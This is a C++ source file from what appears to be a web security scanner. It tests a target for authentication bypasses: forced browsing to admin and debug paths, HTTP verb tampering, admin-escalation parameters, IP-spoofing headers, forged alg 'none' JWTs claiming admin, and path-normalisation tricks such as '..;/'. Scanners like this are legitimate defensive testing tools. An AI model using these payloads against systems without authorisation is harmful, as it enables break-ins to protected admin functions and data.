/// @file auth_bypass.cpp
/// @brief Authentication Bypass Engine — tests auth weaknesses.
#include "auth_bypass.hpp"

#include <algorithm>
#include <regex>
#include <set>
#include <sstream>

namespace apex {

std::string AuthBypass::extract_base_url(const std::string &url) {
  // Extract scheme + host from URL
  auto pos = url.find("://");
  if (pos == std::string::npos)
    return url;
  auto slash = url.find('/', pos + 3);
  if (slash == std::string::npos)
    return url;
  return url.substr(0, slash);
}

bool AuthBypass::is_protected_response(const Response &resp) {
  return resp.status_code == 401 || resp.status_code == 403 ||
         resp.status_code == 302 || resp.status_code == 307;
}

std::vector<Finding> AuthBypass::test(const CrawlResult &crawl,
                                      HttpClient &http, const Config &cfg) {
  std::vector<Finding> findings;

  auto f1 = test_forced_browsing(http, cfg);
  findings.insert(findings.end(), f1.begin(), f1.end());

  auto f2 = test_verb_tampering(crawl, http, cfg);
  findings.insert(findings.end(), f2.begin(), f2.end());

  auto f3 = test_param_pollution(crawl, http, cfg);
  findings.insert(findings.end(), f3.begin(), f3.end());

  auto f4 = test_ip_spoofing(crawl, http, cfg);
  findings.insert(findings.end(), f4.begin(), f4.end());

  auto f5 = test_jwt_bypass(crawl, http, cfg);
  findings.insert(findings.end(), f5.begin(), f5.end());

  auto f6 = test_path_traversal_bypass(crawl, http, cfg);
  findings.insert(findings.end(), f6.begin(), f6.end());

  return findings;
}

std::vector<Finding> AuthBypass::test_forced_browsing(HttpClient &http,
                                                     const Config &cfg) {
  std::vector<Finding> findings;
  std::string base = cfg.target;
  // Remove trailing slash
  if (!base.empty() && base.back() == '/')
    base.pop_back();

  // Admin/debug endpoints to try without authentication
  std::vector<std::string> admin_paths = {
      "/admin",
      "/admin/",
      "/administrator",
      "/admin/dashboard",
      "/admin/users",
      "/admin/config",
      "/dashboard",
      "/panel",
      "/management",
      "/manager",
      "/console",
      "/debug",
      "/debug/vars",
      "/debug/pprof",
      "/_debug",
      "/internal",
      "/internal/status",
      "/actuator",
      "/actuator/env",
      "/actuator/health",
      "/actuator/configprops",
      "/api/admin",
      "/api/internal",
      "/api/debug",
      "/api/v1/admin",
      "/api/v1/users",
      "/graphql",
      "/swagger-ui.html",
      "/api-docs",
      "/phpmyadmin",
      "/wp-admin",
      "/wp-login.php",
      "/.env",
      "/server-status",
      "/server-info",
      "/elmah.axd",
      "/trace.axd",
      "/config",
      "/settings",
      "/setup",
      "/install",
  };

  for (const auto &path : admin_paths) {
    auto resp = http.get(base + path);
    // If we get 200 OK with content, potential forced browsing issue
    if (resp.status_code == 200 && resp.body.size() > 100) {
      // Check it's not a generic 404 page
      std::string body_lower = resp.body;
      std::transform(body_lower.begin(), body_lower.end(), body_lower.begin(),
                     ::tolower);
      if (body_lower.find("not found") == std::string::npos &&
          body_lower.find("404") == std::string::npos) {
        Finding f;
        f.type = "auth-bypass-forced-browsing";
        f.severity = "high";
        f.url = base + path;
        f.detail = "Admin/debug endpoint accessible without authentication";
        f.payload = path;
        f.evidence = "HTTP " + std::to_string(resp.status_code) +
                     ", body size: " + std::to_string(resp.body.size());
        f.confidence = 75;
        f.cwe_id = "CWE-425";
        f.owasp_category = "A01:2021 Broken Access Control";
        f.cvss_score = 7.5;
        findings.push_back(f);
      }
    }
    if (cfg.quick)
      break; // Quick mode: only first path
  }

  return findings;
}

std::vector<Finding> AuthBypass::test_verb_tampering(const CrawlResult &crawl,
                                                    HttpClient &http,
                                                    const Config &cfg) {
  std::vector<Finding> findings;
  std::set<std::string> tested;

  // For each URL that returned 401/403, try different HTTP methods
  for (const auto &url : crawl.urls) {
    if (tested.count(url))
      continue;
    tested.insert(url);

    auto get_resp = http.get(url);
    if (!is_protected_response(get_resp))
      continue;

    // Try POST
    auto post_resp = http.post(url, "", "application/x-www-form-urlencoded");
    if (post_resp.status_code == 200 && post_resp.body.size() > 50) {
      Finding f;
      f.type = "auth-bypass-verb-tampering";
      f.severity = "high";
      f.url = url;
      f.detail = "Protected endpoint accessible via POST (GET returns " +
                 std::to_string(get_resp.status_code) + ")";
      f.payload = "POST method";
      f.evidence = "GET: " + std::to_string(get_resp.status_code) +
                   " → POST: " + std::to_string(post_resp.status_code);
      f.confidence = 80;
      f.cwe_id = "CWE-287";
      f.owasp_category = "A01:2021 Broken Access Control";
      f.cvss_score = 7.5;
      findings.push_back(f);
    }

    // Try with different content types
    auto json_resp =
        http.post(url, "{}", "application/json");
    if (json_resp.status_code == 200 && json_resp.body.size() > 50 &&
        !is_protected_response(json_resp)) {
      Finding f;
      f.type = "auth-bypass-verb-tampering";
      f.severity = "high";
      f.url = url;
      f.detail = "Protected endpoint accessible via JSON POST";
      f.payload = "POST application/json";
      f.evidence = "GET: " + std::to_string(get_resp.status_code) +
                   " → JSON POST: " + std::to_string(json_resp.status_code);
      f.confidence = 80;
      f.cwe_id = "CWE-287";
      f.owasp_category = "A01:2021 Broken Access Control";
      f.cvss_score = 7.5;
      findings.push_back(f);
    }

    if (cfg.quick && findings.size() >= 3)
      break;
  }

  return findings;
}

std::vector<Finding>
AuthBypass::test_param_pollution(const CrawlResult &crawl, HttpClient &http,
                                 const Config &cfg) {
  std::vector<Finding> findings;

  // Admin-escalation parameters
  std::vector<std::pair<std::string, std::string>> escalation_params = {
      {"admin", "true"},       {"role", "admin"},
      {"is_admin", "1"},       {"isAdmin", "true"},
      {"privilege", "admin"},  {"access_level", "admin"},
      {"user_role", "admin"},  {"auth", "admin"},
      {"group", "admin"},      {"permissions", "all"},
      {"level", "9"},          {"type", "admin"},
      {"debug", "true"},       {"test", "true"},
      {"internal", "1"},       {"bypass", "1"},
  };

  std::set<std::string> tested;
  for (const auto &url : crawl.urls) {
    if (tested.count(url))
      continue;
    tested.insert(url);

    auto baseline = http.get(url);
    if (baseline.status_code == 0)
      continue;

    for (const auto &[param, value] : escalation_params) {
      std::string separator = (url.find('?') != std::string::npos) ? "&" : "?";
      std::string test_url = url + separator + param + "=" + value;

      auto resp = http.get(test_url);

      // Detect privilege escalation: protected → accessible, or different content
      if (is_protected_response(baseline) && resp.status_code == 200 &&
          resp.body.size() > 50) {
        Finding f;
        f.type = "auth-bypass-param-pollution";
        f.severity = "critical";
        f.url = test_url;
        f.detail = "Adding '" + param + "=" + value +
                   "' bypasses authentication";
        f.param = param;
        f.payload = param + "=" + value;
        f.evidence = "Baseline: " + std::to_string(baseline.status_code) +
                     " → With param: " + std::to_string(resp.status_code);
        f.confidence = 85;
        f.cwe_id = "CWE-639";
        f.owasp_category = "A01:2021 Broken Access Control";
        f.cvss_score = 9.1;
        findings.push_back(f);
      } else if (baseline.status_code == 200 &&
                 resp.body.size() > baseline.body.size() * 1.5 &&
                 resp.body.size() - baseline.body.size() > 200) {
        // Significant content increase might indicate data leakage
        Finding f;
        f.type = "auth-bypass-param-pollution";
        f.severity = "medium";
        f.url = test_url;
        f.detail = "Parameter '" + param + "=" + value +
                   "' causes significant response change";
        f.param = param;
        f.payload = param + "=" + value;
        f.evidence =
            "Baseline size: " + std::to_string(baseline.body.size()) +
            " → With param: " + std::to_string(resp.body.size());
        f.confidence = 60;
        f.cwe_id = "CWE-639";
        f.owasp_category = "A01:2021 Broken Access Control";
        f.cvss_score = 5.3;
        findings.push_back(f);
      }
    }

    if (cfg.quick && findings.size() >= 3)
      break;
  }

  return findings;
}

std::vector<Finding> AuthBypass::test_ip_spoofing(const CrawlResult &crawl,
                                                  HttpClient &http,
                                                  const Config &cfg) {
  std::vector<Finding> findings;

  // Headers to spoof internal IP
  std::vector<std::pair<std::string, std::string>> spoof_headers = {
      {"X-Forwarded-For", "127.0.0.1"},
      {"X-Real-IP", "127.0.0.1"},
      {"X-Originating-IP", "127.0.0.1"},
      {"X-Remote-IP", "127.0.0.1"},
      {"X-Remote-Addr", "127.0.0.1"},
      {"X-Client-IP", "127.0.0.1"},
      {"X-Forwarded-For", "10.0.0.1"},
      {"X-Forwarded-For", "192.168.1.1"},
      {"True-Client-IP", "127.0.0.1"},
      {"Cluster-Client-IP", "127.0.0.1"},
      {"X-ProxyUser-Ip", "127.0.0.1"},
      {"CF-Connecting-IP", "127.0.0.1"},
  };

  std::set<std::string> tested;
  for (const auto &url : crawl.urls) {
    if (tested.count(url))
      continue;
    tested.insert(url);

    auto baseline = http.get(url);
    if (!is_protected_response(baseline))
      continue;

    for (const auto &[header, value] : spoof_headers) {
      std::vector<std::pair<std::string, std::string>> hdrs = {{header, value}};
      auto resp = http.get(url, hdrs);

      if (resp.status_code == 200 && resp.body.size() > 50) {
        Finding f;
        f.type = "auth-bypass-ip-spoof";
        f.severity = "critical";
        f.url = url;
        f.detail = "IP spoofing via " + header + ": " + value +
                   " bypasses access control";
        f.payload = header + ": " + value;
        f.evidence = "Baseline: " + std::to_string(baseline.status_code) +
                     " → With header: " + std::to_string(resp.status_code);
        f.confidence = 90;
        f.cwe_id = "CWE-290";
        f.owasp_category = "A01:2021 Broken Access Control";
        f.cvss_score = 9.8;
        findings.push_back(f);
        break; // One is enough per URL
      }
    }

    if (cfg.quick && findings.size() >= 2)
      break;
  }

  return findings;
}

std::vector<Finding> AuthBypass::test_jwt_bypass(const CrawlResult &crawl,
                                                 HttpClient &http,
                                                 const Config &cfg) {
  std::vector<Finding> findings;
  (void)cfg;

  // JWT "alg:none" bypass — craft a token with no signature
  // Header: {"alg":"none","typ":"JWT"}  base64url: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
  // Payload: {"sub":"admin","role":"admin","iat":1700000000}
  // base64url: eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0
  std::string none_jwt =
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
      "eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.";

  // Also try with empty signature variations
  std::vector<std::string> jwt_payloads = {
      none_jwt,
      none_jwt + ".",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
      "eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.",
  };

  std::set<std::string> tested;
  for (const auto &url : crawl.urls) {
    if (tested.count(url))
      continue;
    tested.insert(url);

    auto baseline = http.get(url);
    if (!is_protected_response(baseline))
      continue;

    for (const auto &jwt : jwt_payloads) {
      std::vector<std::pair<std::string, std::string>> hdrs = {
          {"Authorization", "Bearer " + jwt}};
      auto resp = http.get(url, hdrs);

      if (resp.status_code == 200 && resp.body.size() > 50) {
        Finding f;
        f.type = "auth-bypass-jwt-none";
        f.severity = "critical";
        f.url = url;
        f.detail = "JWT algorithm 'none' bypass accepted — authentication "
                   "completely broken";
        f.payload = "Bearer " + jwt.substr(0, 40) + "...";
        f.evidence = "Baseline: " + std::to_string(baseline.status_code) +
                     " → With JWT none: " + std::to_string(resp.status_code);
        f.confidence = 95;
        f.cwe_id = "CWE-347";
        f.owasp_category = "A02:2021 Cryptographic Failures";
        f.cvss_score = 9.8;
        findings.push_back(f);
        break;
      }
    }

    if (findings.size() >= 5)
      break;
  }

  return findings;
}

std::vector<Finding>
AuthBypass::test_path_traversal_bypass(const CrawlResult &crawl,
                                       HttpClient &http, const Config &cfg) {
  std::vector<Finding> findings;
  std::string base = cfg.target;
  if (!base.empty() && base.back() == '/')
    base.pop_back();

  // Path traversal bypass patterns
  std::vector<std::string> bypass_patterns = {
      "/admin/../admin",
      "/admin/./",
      "//admin",
      "/./admin",
      "/admin%20",
      "/admin%09",
      "/admin;",
      "/admin..;/",
      "/ADMIN",
      "/Admin",
      "/admin/~",
      "/%61dmin",       // URL-encoded 'a'
      "/admin%00",      // Null byte
      "/admin%0a",      // Newline
      "/admin?",
      "/admin#",
      "/admin.json",
      "/admin.html",
      "/v1/../admin",
      "/api/../admin",
  };

  // Get baseline for /admin
  auto admin_baseline = http.get(base + "/admin");
  if (!is_protected_response(admin_baseline))
    return findings; // Admin isn't protected, nothing to bypass

  for (const auto &pattern : bypass_patterns) {
    auto resp = http.get(base + pattern);

    if (resp.status_code == 200 && resp.body.size() > 100 &&
        !is_protected_response(resp)) {
      // Verify it's not just a generic page
      std::string body_lower = resp.body;
      std::transform(body_lower.begin(), body_lower.end(), body_lower.begin(),
                     ::tolower);
      if (body_lower.find("not found") != std::string::npos ||
          body_lower.find("404") != std::string::npos)
        continue;

      Finding f;
      f.type = "auth-bypass-path-traversal";
      f.severity = "critical";
      f.url = base + pattern;
      f.detail = "Path traversal bypass for admin endpoint";
      f.payload = pattern;
      f.evidence =
          "/admin returns " + std::to_string(admin_baseline.status_code) +
          " but bypass returns " + std::to_string(resp.status_code);
      f.confidence = 85;
      f.cwe_id = "CWE-22";
      f.owasp_category = "A01:2021 Broken Access Control";
      f.cvss_score = 9.1;
      findings.push_back(f);
    }

    if (cfg.quick && findings.size() >= 2)
      break;
  }

  // Also test traversal on any protected URLs in crawl
  std::set<std::string> tested;
  for (const auto &url : crawl.urls) {
    if (tested.size() >= 10)
      break;
    auto resp = http.get(url);
    if (!is_protected_response(resp))
      continue;
    tested.insert(url);

    // Try ..;/ bypass (Tomcat/Spring)
    std::string dotdot_url = url;
    auto last_slash = dotdot_url.rfind('/');
    if (last_slash != std::string::npos && last_slash > 8) {
      std::string segment = dotdot_url.substr(last_slash);
      dotdot_url =
          dotdot_url.substr(0, last_slash) + "/..;/" + segment.substr(1);
      auto bypass_resp = http.get(dotdot_url);
      if (bypass_resp.status_code == 200 && bypass_resp.body.size() > 100) {
        Finding f;
        f.type = "auth-bypass-path-traversal";
        f.severity = "critical";
        f.url = dotdot_url;
        f.detail = "..;/ path normalization bypass on protected endpoint";
        f.payload = "..;/ bypass";
        f.evidence = "Original: " + std::to_string(resp.status_code) +
                     " → Bypass: " +
                     std::to_string(bypass_resp.status_code);
        f.confidence = 88;
        f.cwe_id = "CWE-22";
        f.owasp_category = "A01:2021 Broken Access Control";
        f.cvss_score = 9.1;
        findings.push_back(f);
      }
    }
  }

  return findings;
}

} // namespace apex
